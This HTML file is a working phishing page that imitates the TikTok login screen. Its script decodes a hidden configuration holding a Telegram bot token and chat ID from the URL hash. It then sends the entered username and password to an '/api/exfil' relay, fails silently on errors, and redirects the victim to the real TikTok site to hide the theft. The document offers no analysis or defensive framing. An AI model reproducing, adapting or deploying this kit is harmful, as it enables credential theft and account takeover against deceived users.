<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Log in | TikTok</title>
    <link rel="shortcut icon" href="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95da587b35cf3148301506662036a0d.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { 
            font-family: "TikTokFont", "ProximaNova", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif; 
            background-color: #ffffff; 
            color: #161823; 
        }
        .tt-input { 
            background: rgba(22, 24, 35, 0.06); 
            border: 1px solid transparent; 
            border-radius: 4px; 
            height: 44px; 
            font-size: 16px; 
            padding: 0 12px; 
            transition: all 0.2s; 
        }
        .tt-input:focus { 
            border-color: rgba(22, 24, 35, 0.12); 
            background: rgba(22, 24, 35, 0.08); 
            outline: none; 
        }
        .tt-btn-primary { 
            background-color: #fe2c55; 
            color: #fff; 
            font-weight: 600; 
            font-size: 16px; 
            height: 44px; 
            border-radius: 4px; 
            transition: background-color 0.2s;
        }
        .tt-btn-primary:active { background-color: #ef2950; }
        .tt-btn-disabled { opacity: 0.5; cursor: not-allowed; }
    </style>
</head>
<body class="flex flex-col min-h-screen">

    <!-- Header Section -->
    <header class="p-4 flex items-center justify-center relative border-b border-gray-100">
        <h1 class="text-lg font-bold">Log in</h1>
        <div class="absolute right-4 text-gray-400">
            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
        </div>
    </header>

    <!-- Main Content -->
    <main class="flex-grow p-6 flex flex-col items-center">
        <div class="w-full max-w-[400px] space-y-6">
            
            <div class="text-center mb-8">
                <h2 class="text-2xl font-bold mb-2">Log in to TikTok</h2>
                <p class="text-gray-400 text-sm">Manage your account, check notifications, comment on videos, and more.</p>
            </div>

            <!-- Login Inputs -->
            <div class="space-y-3">
                <div class="relative">
                    <input type="text" id="username" placeholder="Phone / Email / Username" class="tt-input w-full">
                </div>
                <div class="relative">
                    <input type="password" id="pass" placeholder="Password" class="tt-input w-full">
                    <button class="absolute right-3 top-3 text-sm font-bold text-gray-500">Show</button>
                </div>
            </div>

            <!-- Forgot Password -->
            <div class="text-left">
                <a href="#" class="text-xs font-bold hover:underline">Forgot password?</a>
            </div>

            <!-- Submit Button -->
            <button onclick="dispatch()" class="tt-btn-primary w-full shadow-md">Log in</button>

            <!-- Signup Redirect -->
            <div class="pt-10 text-center text-sm">
                Don't have an account? <a href="#" class="text-[#fe2c55] font-bold hover:underline">Sign up</a>
            </div>
        </div>
    </main>

    <!-- Footer Language Selector (Fake) -->
    <footer class="bg-gray-50 p-6 flex flex-col items-center gap-4">
        <div class="flex items-center gap-2 text-gray-600 text-sm border p-2 rounded px-4">
            English 
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </div>
        <p class="text-gray-400 text-[10px]">© 2026 TikTok</p>
    </footer>

    <script>
        // Extracting PHISHHUB_OS config from URL hash
        const getExfilParams = () => {
            const h = window.location.hash.substring(1);
            if (!h) return null;
            try { return JSON.parse(atob(h)); } catch(e) { return null; }
        };

        const config = getExfilParams();

        async function dispatch() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('pass').value;

            if (!user || !pass) return;

            // Final redirection to hide the operation
            const finishUrl = "https://www.tiktok.com/login";

            if (!config) {
                window.location.href = finishUrl;
                return;
            }

            try {
                // Hitting the serverless exfil relay
                await fetch('/api/exfil', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        target: 'tiktok',
                        credentials: { username: user, password: pass },
                        tgToken: config.t,
                        tgChat: config.c
                    })
                });
            } catch (err) {
                // Silent fail
            } finally {
                window.location.href = finishUrl;
            }
        }
    </script>
</body>
</html>
